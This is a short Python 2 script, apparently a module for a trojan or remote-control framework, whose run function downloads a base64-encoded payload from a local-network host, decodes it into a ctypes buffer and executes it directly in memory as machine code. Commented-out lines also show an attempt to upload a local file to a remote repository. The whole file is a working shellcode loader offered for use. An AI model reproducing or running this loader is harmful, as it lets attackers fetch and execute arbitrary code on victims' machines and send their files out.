#import requests
import urllib2
import ctypes
import base64
def run(**args):
  try:
     url = "http://192.168.1.2:8000/file.bin"
     response = urllib2.urlopen(url)
     file = base64.b64decode(response.read())
     file_buffer = ctypes.create_string_buffer(file, len(file))
     file_func = ctypes.cast(file_buffer, ctypes.CFUNCTYPE
     (ctypes.c_void_p))
     file_func()
    #  print("Testing") 
    #  url='https://github.com/experiment2016/workhub/tree/master/data/post'
    #  files = {'upload_file': open('file.txt','rb')}
    #  values={'upload_file' : 'file.txt'}
    #  r=requests.post(url,files=files,data=values)
  except Exception, e:
      return str(e)
  
  
